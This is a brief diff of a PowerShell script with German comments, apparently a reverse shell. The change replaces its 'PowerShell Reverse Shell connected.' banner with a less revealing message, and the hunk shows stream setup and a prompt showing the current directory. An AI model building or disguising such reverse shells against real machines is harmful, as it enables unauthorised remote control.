@@ -31,7 +31,7 @@ try {
     Write-Log "Streams created."
 
     # Sende einen Willkommensgruß und das aktuelle Verzeichnis
-    $welcomeMessage = "PowerShell Reverse Shell connected.`n" + (Get-Location).Path + "> "
+    $welcomeMessage = "You in L400.`n" + (Get-Location).Path + "> "
     $sw.WriteLine($welcomeMessage);
     $sw.Flush();
     Write-Log "Welcome message sent."
